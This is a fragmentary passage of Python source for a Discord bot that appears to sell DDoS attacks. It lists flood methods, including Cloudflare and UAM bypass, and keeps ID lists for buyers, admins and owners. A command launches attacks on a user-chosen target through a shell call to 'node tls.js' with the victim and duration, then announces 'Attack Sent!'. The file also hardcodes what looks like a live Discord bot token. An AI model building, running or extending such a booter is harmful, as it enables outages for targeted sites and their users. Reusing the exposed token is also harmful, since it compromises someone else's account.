...
buyers  = [1010425243015327865]  #          
admins  = [1010425243015327865]  #   ID users            
owners  = [1010425243015327865]  #          
methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','TLS','SIEUCAP','UAM-BYPASS','SLOW'] # Methods
year_now= datetime.datetime.now().strftime("%Y")     
token   = 'MTAyNDE3MTYyNTMzNzMyMzU5MA.G6yyEX.JTlwKnZogeMhi272VYq2rkGIcgDRygSy6k2j2A' # paste your token here
...
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="NaBiKa | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        ...
        embed.set_footer(text = f"©{year_now} Copyright BaoAn.")
        ...
        if method is None:
            ...
            await ctx.send(embed=embed)
                ...
                if method == 'HTTP-FLOOD':
                    embed = discord.Embed(title=f"NABIKA | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    ...
                    embed.set_footer(text = f"©{year_now} Copyright NABIKA.")
                    await ctx.send(embed=embed)
                    ...
                    embed.set_footer(text = f"©{year_now} Copyright NABIKA.")
                    await ctx.send(embed=embed)
                    system(f'node tls.js {victim} {time2}')
                elif method == 'TLS':
                    embed = discord.Embed(title=f"NABIKA | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://media1.giphy.com/media/CchzkJJ6UrQmQ/giphy.gif?cid=ecf05e470hz1qvmwymn9k93tukhj9eiwalbep6jkmfu0k0k1&rid=giphy.gif&ct=g")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    ...
                    embed = discord.Embed(title=f"NABIKA NETWORK | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
